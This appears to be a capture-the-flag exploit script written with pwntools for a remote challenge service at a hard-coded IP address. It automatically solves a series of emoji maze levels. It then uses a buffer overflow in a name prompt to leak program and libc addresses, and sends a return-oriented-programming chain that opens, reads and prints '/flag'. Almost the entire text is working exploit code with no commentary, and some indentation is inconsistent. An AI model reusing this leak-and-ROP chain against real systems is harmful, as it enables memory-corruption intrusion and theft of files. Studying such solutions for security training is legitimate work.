from pwn import *

io=remote('81.68.174.63',62176)
#io=remote('170.106.35.18',62176)
ELF('./pwn')
#io=process('./pwn')
libc=ELF('./libc-2.31.so')	
#libc=ELF('./libc-2.23.so')

def check_valid(mg, x, y):
	if x >= 0 and x < len(mg) and y >= 0 and y < len(mg[0]) and mg[x][y] == 1:
        	return True
        else:
        	return False
	 
	
step = []
	 

		

for k in range(100):
	io.recvuntil('level')
	io.recvline()
	line=io.recvline()
	line1=[]
	for i in range(0,len(line[:-1]),3):
		line1.append(line[i]+line[i+1]+line[i+2])
	msg=[]
	t=[]
	for i in line1:
		if i=='\xe2\xac\x9b':
			t.append(0)
	msg.append(t)
	

	dstx=0
	dsty=0
	srcx=0
	srcy=0

	for j in range(len(line1)-1):
		t=[]
		line=io.recvline()
		linen=[]
		i=0
		while line[i]!='\n':
			if line[i]=='\xe2':
				if (line[i]+line[i+1]+line[i+2])=='\xe2\xac\x9b':
					t.append(0)
				else:
					t.append(1) 
				i+=3
			else:
				if (line[i]+line[i+1]+line[i+2]+line[i+3])=='\xf0\x9f\x9a\xa9':
					
					t.append(1)
					srcx=len(msg)
					srcy=len(t)-1
					
				else :				
					t.append(1)
					dstx=len(msg)
					dsty=len(t)-1
				
				i+=4	
		
		msg.append(t)


		#print(msg,(dstx,dsty),(srcx,srcy))

	path=""
	def walk(mg, x, y,path):
		global step
		s=path
		if x == srcx and y == srcy:

			io.sendline(s)
		 
		if check_valid(mg, x, y):
			#step.append((x, y))
			mg[x][y] = 2
			walk(mg, x, y+1,s+'d')
			walk(mg, x, y-1,s+'a')
			walk(mg, x-1, y,s+'w')
			walk(mg, x+1, y,s+'s')

	walk(msg, dstx, dsty,path)


io.recvuntil('your name:')

io.sendline('b'*0x10+'a'*0x60+p64(0xc000049d70)+p64(0x20)+p64(0x20)+'a'*0x88+'\xce')
#+p64(0xffffffffff600000)+'bbbbbbbb')



io.recvuntil('Your name is : ')
base=u64(io.recv(8))-0x1666c0
print(hex(base))
print(hex(u64(io.recv(8))))
print(hex(u64(io.recv(8))))
print(hex(u64(io.recv(8))))

free_got=base+0x1EEED8
fwrite=base+0x01EEFD0

io.sendline('b'*0x10+'a'*0x60+p64(fwrite)+p64(0x20)+p64(0x20)+'a'*0x88+'\xce')
io.recvuntil('Your name is : ')
free_add=u64(io.recv(8))
#libc_base=free_add-0x084540
libc_base=free_add-libc.sym['__libc_start_main']
print(hex(free_add),hex(libc.sym['__libc_start_main']))
print(hex(libc_base))
pop_rdi=base+0x0109d3d
pop_rsi=libc_base+0x27529
pop_rdx=libc_base+0x011c1e1

#pop_rsi=libc_base+0x0202f8
#pop_rdx=libc_base+0x115164

write=libc_base+libc.sym['write']
fopen=libc_base+libc.sym['open']
read=libc_base+libc.sym['read']
ddir=libc_base+libc.sym['getdents64']
#fopen=libc_base+0x0f70f0
#read=libc_base+0x0f7310
#write=libc_base+0x0f7370


bss=base+0x21B9CD


main=base+0x1197CE

#io.sendline('b'*0x10+'a'*0x60+p64(free_got)+p64(0x20)+p64(0x20)+'a'*0x88+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(100)+p64(0)+p64(read)+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(fopen)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(100)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(100)+p64(0)+p64(write)+p64(main))
io.sendline('b'*0x10+'a'*0x60+p64(free_got)+p64(0x20)+p64(0x20)+'a'*0x88+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(100)+p64(0)+p64(read)+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(fopen)+p64(pop_rdi)+p64(6)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(4096)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(4096)+p64(0)+p64(write)+p64(main))
io.sendline('/flag\x00')

io.interactive()
